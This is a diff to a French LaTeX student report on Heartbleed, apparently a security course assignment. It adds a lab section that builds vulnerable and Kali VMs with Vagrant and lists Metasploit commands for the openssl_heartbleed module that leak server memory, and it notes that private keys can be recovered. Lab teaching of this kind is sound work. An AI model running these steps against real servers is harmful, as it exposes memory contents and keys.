@@ -96,13 +96,44 @@ Avant la correction de cette faille de sécurite, il était possible de fermet c
 % Pour cette faille proposer une expérimentation permettant de mettre en évidence la vulnérabilité et son exploitation :
 % En mettant en place une machine virtuelle (peut être une image docker) avec le service vulnérable, le rapport indiquera comment cette machine a été créée
 % En décrivant une procédure d’exploitation de la faille en expliquant son mécanisme. Cette exploitation peut utiliser le framework metasploit ou utiliser des exploits disponibles sur le Web(en citant vos sources)
+\subsection{Expérimentation}
+%https://alexandreborgesbrazil.files.wordpress.com/2014/04/heartbleed_article_rev_b.pdf
+
+Nous utilisons vagrant pour lancer notre machine virtuelle. La commande \textit{vagrant up} permet de créer la machine virtuelle avec virtualbox. Tous les outils necessaires à l'expérimentation sont installé sur la machine virtuelle. Cette machine virtuelle joue le role du serveur. Une autre machine, cette fois cliente, est installé avec Kali Linux afin d'exploiter la faille. 
+
+Pour lancer les machines, dirigez vous dans le dossier "experimentation" puis lancez la commande "vagrant up". Cette commande va installer les machines. 
+Une fois installé, lancer la commande "vagrant ssh client" pour connecter à la machine cliente (kali).
+ 
+Maintenant lancez les commandes : \\
+sudo msfupdate\\
+sudo msfconsole\\
+
+puis dans la console:\\
+use auxiliary/scanner/ssl/openssl\_heartbleed\\
+set RHOTS <votreip> \\
+set RPORT 13443\\
+set verbose true\\
+run\\
+
+On peut voir des informations récupérées, dans la catégorie "Printable info leaked". Avec des outils plus poussés et de nombreuses requetes, il est possible de récupérer la clef privée. 
+
+% outil plus puissant à installer sur kali : https://github.com/robertdavidgraham/heartleech
+
+
+\appendix
+
+\section{Glossaire}
+
+\section{Références}
 % Joindre au devoir un glossaire des termes utilisés
 % Joindre au devoir l'ensemble des références utilisées
-% Ce travail est à faire 2 fois, une fois avant fin décembre et une fois en janvier, et une évaluation par les pairs est organisée afin de vous enrichir les uns du travail des autres. La note prend en compte le travail fait (par groupe de 3), ainsi que les évaluations faites par chacun (fait individuellement)
 
 
 %Document PDF sur Teide avec les éléments décrits dans la partie évaluation
 %Lien vers l'image de la machine virtuelle créée pour l'expérimentation, ou DockerFile + scripts si suffisant
+
+% Ce travail est à faire 2 fois, une fois avant fin décembre et une fois en janvier, et une évaluation par les pairs est organisée afin de vous enrichir les uns du travail des autres. La note prend en compte le travail fait (par groupe de 3), ainsi que les évaluations faites par chacun (fait individuellement)
+
 
 
 %Notre sujet : http://heartbleed.com/
